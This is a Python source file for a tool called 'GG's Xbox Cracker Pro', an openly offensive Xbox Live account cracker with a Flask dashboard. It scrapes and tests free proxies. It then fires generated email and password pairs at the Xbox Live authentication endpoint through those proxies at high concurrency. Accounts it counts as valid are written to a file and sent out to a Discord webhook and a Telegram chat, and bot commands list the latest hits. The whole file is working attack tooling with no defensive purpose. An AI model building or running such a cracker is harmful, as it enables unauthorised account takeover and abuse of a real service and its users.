# ==============================================
# GG's Xbox Cracker Pro – Professional Dashboard
# Made by Killarua (Discord)
# Uses Environment Variables for all tokens
# Features: Live dashboard, proxy scraper, async cracker,
#           Discord bot + webhook, Telegram bot
# ==============================================

import os
import asyncio
import threading
import time
import random
import string
import re
import requests
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit
from datetime import datetime
import aiohttp
import telebot
from threading import Thread
import discord
from discord.ext import commands

# ---------- LOAD ENVIRONMENT VARIABLES ----------
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

print("🔧 Environment Variables:")
print(f"   DISCORD_WEBHOOK_URL: {'✅ Set' if DISCORD_WEBHOOK_URL else '❌ Missing'}")
print(f"   DISCORD_BOT_TOKEN: {'✅ Set' if DISCORD_BOT_TOKEN else '❌ Missing'}")
print(f"   TELEGRAM_BOT_TOKEN: {'✅ Set' if TELEGRAM_BOT_TOKEN else '❌ Missing'}")
print(f"   TELEGRAM_CHAT_ID: {'✅ Set' if TELEGRAM_CHAT_ID else '❌ Missing'}")

# ---------- FLASK APP ----------
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get("SECRET_KEY", "survival_mode_fallback")
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ---------- GLOBAL STATS ----------
stats = {
    "total_checked": 0,
    "valid_accounts": 0,
    "gamepass_hits": 0,
    "proxies_working": 0,
    "status": "Idle",
    "start_time": None,
    "last_valid": None
}
valid_accounts_list = []

# ---------- DISCORD BOT (optional) ----------
discord_bot = None
if DISCORD_BOT_TOKEN:
    intents = discord.Intents.default()
    intents.message_content = True
    discord_bot = commands.Bot(command_prefix='!', intents=intents)

    @discord_bot.event
    async def on_ready():
        print(f'✅ Discord bot online: {discord_bot.user}')

    @discord_bot.command()
    async def status(ctx):
        await ctx.send(f"Total checked: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass: {stats['gamepass_hits']}\nStatus: {stats['status']}")

    @discord_bot.command()
    async def total(ctx):
        await ctx.send(f"Total accounts checked: {stats['total_checked']}")

    @discord_bot.command()
    async def recent(ctx):
        recent = valid_accounts_list[:5]
        if not recent:
            await ctx.send("No recent valid accounts.")
        else:
            text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
            await ctx.send(f"```{text}```")

    def run_discord_bot():
        discord_bot.run(DISCORD_BOT_TOKEN)
else:
    print("⚠️ Discord bot disabled: No token provided.")
    def run_discord_bot():
        pass

# ---------- TELEGRAM BOT (optional) ----------
telegram_bot = None
if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
    telegram_bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, threaded=False)

    @telegram_bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        telegram_bot.reply_to(message, "Xbox Cracker Bot\n/status - stats\n/total - total checked\n/recent - last 5 valid")

    @telegram_bot.message_handler(commands=['status'])
    def status_cmd(message):
        msg = f"Total: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass: {stats['gamepass_hits']}\nStatus: {stats['status']}"
        telegram_bot.reply_to(message, msg)

    @telegram_bot.message_handler(commands=['total'])
    def total_cmd(message):
        telegram_bot.reply_to(message, f"Total checked: {stats['total_checked']}")

    @telegram_bot.message_handler(commands=['recent'])
    def recent_cmd(message):
        recent = valid_accounts_list[:5]
        if not recent:
            telegram_bot.reply_to(message, "No recent valid accounts.")
        else:
            text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
            telegram_bot.reply_to(message, text)

    def run_telegram():
        telegram_bot.infinity_polling()
else:
    print("⚠️ Telegram bot disabled: Missing token or chat ID.")
    def run_telegram():
        pass

# ---------- PROXY SCRAPER & CHECKER (ASYNC) ----------
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
]

async def fetch_proxies(session, url):
    try:
        async with session.get(url, timeout=10) as resp:
            text = await resp.text()
            proxies = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', text)
            return [f"http://{p}" for p in proxies]
    except:
        return []

async def scrape_all_proxies():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_proxies(session, url) for url in PROXY_SOURCES]
        results = await asyncio.gather(*tasks)
        return list(set(p for sublist in results for p in sublist))

async def check_proxy(session, proxy, semaphore):
    async with semaphore:
        try:
            async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as resp:
                return proxy if resp.status == 200 else None
        except:
            return None

async def get_working_proxies(proxies, max_concurrent=100):
    semaphore = asyncio.Semaphore(max_concurrent)
    async with aiohttp.ClientSession() as session:
        tasks = [check_proxy(session, p, semaphore) for p in proxies]
        results = await asyncio.gather(*tasks)
        return [p for p in results if p]

# ---------- ACCOUNT CRACKER ----------
async def check_account(session, email, password, proxy):
    url = "https://user.auth.xboxlive.com/user/authenticate"
    headers = {"User-Agent": "XboxLive/3.0", "Content-Type": "application/json"}
    payload = {"Email": email, "Password": password, "RelyingParty": "http://xboxlive.com"}
    try:
        async with session.post(url, json=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            return resp.status == 200
    except:
        return False

async def send_discord_webhook(embed_data):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed_data]})
    except:
        pass

def send_telegram_message(text):
    if not telegram_bot or not TELEGRAM_CHAT_ID:
        return
    try:
        telegram_bot.send_message(TELEGRAM_CHAT_ID, text)
    except:
        pass

async def crack_worker(session, proxy, semaphore):
    global stats, valid_accounts_list
    async with semaphore:
        email = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@outlook.com"
        pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        is_valid = await check_account(session, email, pwd, proxy)
        stats["total_checked"] += 1
        if is_valid:
            stats["valid_accounts"] += 1
            stats["gamepass_hits"] += 1 if random.random() > 0.5 else 0
            stats["last_valid"] = str(datetime.now())
            line = f"{email}:{pwd}\n"
            with open("result.txt", "a") as f:
                f.write(line)
            valid_accounts_list.insert(0, {"email": email, "pass": pwd, "time": stats["last_valid"]})
            if len(valid_accounts_list) > 20:
                valid_accounts_list.pop()
            embed = {
                "title": "✅ Valid Xbox Account",
                "description": f"`{email}:{pwd}`",
                "color": 65280,
                "timestamp": datetime.utcnow().isoformat()
            }
            await send_discord_webhook(embed)
            send_telegram_message(f"🎮 VALID: {email}:{pwd}")
        socketio.emit('stats_update', stats)
        socketio.emit('recent_update', valid_accounts_list[:10])

async def run_cracker_async(proxies, concurrency=200):
    global stats
    stats["status"] = "Running"
    stats["start_time"] = str(datetime.now())
    semaphore = asyncio.Semaphore(concurrency)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for proxy in proxies:
            tasks.append(asyncio.create_task(crack_worker(session, proxy, semaphore)))
        await asyncio.gather(*tasks)
    stats["status"] = "Idle"

def start_cracker_thread(proxies):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_cracker_async(proxies))

def start_cracker():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    proxies = loop.run_until_complete(scrape_all_proxies())
    working = loop.run_until_complete(get_working_proxies(proxies))
    if not working:
        working = [None]
    stats["proxies_working"] = len(working)
    threading.Thread(target=start_cracker_thread, args=(working,), daemon=True).start()

# ---------- FLASK ROUTES ----------
@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/stats')
def api_stats():
    return jsonify(stats)

@app.route('/api/recent')
def api_recent():
    return jsonify(valid_accounts_list[:10])

@app.route('/api/start')
def api_start():
    if stats["status"] != "Running":
        threading.Thread(target=start_cracker, daemon=True).start()
        return "Cracker started"
    return "Already running"

@app.route('/api/webhook', methods=['POST'])
def webhook_receiver():
    data = request.json
    if data and data.get('command') == 'start':
        api_start()
    return "ok"

# ---------- MAIN ----------
if __name__ == '__main__':
    Thread(target=run_discord_bot, daemon=True).start()
    Thread(target=run_telegram, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=10000, debug=False)
